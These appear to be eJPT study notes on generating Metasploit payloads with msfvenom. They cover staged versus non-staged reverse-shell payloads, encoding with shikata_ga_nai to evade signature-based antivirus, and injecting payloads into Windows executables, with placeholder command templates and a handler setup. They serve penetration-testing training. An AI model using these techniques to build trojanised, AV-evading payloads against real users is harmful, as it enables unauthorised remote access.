# 31 Payloads

# Generating Payloads with Msfvenom 

## Client-side Attacks

- A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed
- Client-side attacks typically utilize various social engineering techniques like generating malicious documents or portable executables (PEs)
- Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system
- Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV (anti-virus) detection

## Msfvenom

- Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers
- Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
- We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system 

## Staged or Non-staged

- **Staged**
	- Payload is split into two parts
		1. Stage (the stager): a small piece of code that connects back to the attack's machine 
		2. Stage: the full payload (e.g. Meterpreter), which get downloaded and executed after the connection is established
	- Pro
		- Smaller size initially
		- Can bypass some defenses
	- Cons
		- Requires a stable network connection; if the second stage fails, the payload breaks
		- Can trigger more alerts in firewalls or IDS due to multiple stages

- **Non-staged**
	- It's executed all at once
	- Pro
		- More stable
		- Easier to debug and test
	- Cons
		- Larger size, so not ideal for exploits with strict size limits
		- Less flexible, since it can't dynamically load modules like Meterpreter extensions

### DEMO

```shell
msfvenom --list payloads
msfvenom --list formats

# Example
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > /path/to/save/payload.format

# Set a handler
msf6: exploit(multi/handler)
msf6: set payload <payload>
```


# Encoding Payloads with Msfvenom

- Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection
- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables
- We can evade older signature based AV solutions by encoding our payloads
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature

## Shellcode

- Shellcode is a piece of code typically used as a payload for exploitation
- It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system

### DEMO

```shell
msfvenom --list encoders

# Example 
msfvenom -p <payload> lhost=<ip> lport=<port> -e <encoder> -f format > /path/to/save/encoded.format

# With shikata_ga_nai we can increase the number of iterations for better encoding
msfvenom -p <payload> lhost=<ip> lport=<port> -i <iterations> -e <encoder> -f format > /path/to/save/encoded.format
```


# Injecting Payloads into Windows Portable Executables

### DEMO

```shell
# Not maitain the original executable functions
msfvenom -p <payload> lhost=<ip> lport=<port> -i <iterations> -e <encoder> -f format -x <executable> > /path/to/save/encodedexecutable.format

# To maitain the original executable functions
Add the '-k', but dont work well

# Migrate the process after exploitation
meterpreter: run post/windows/manage/migrate 
```

#eJPT #cybersecurity 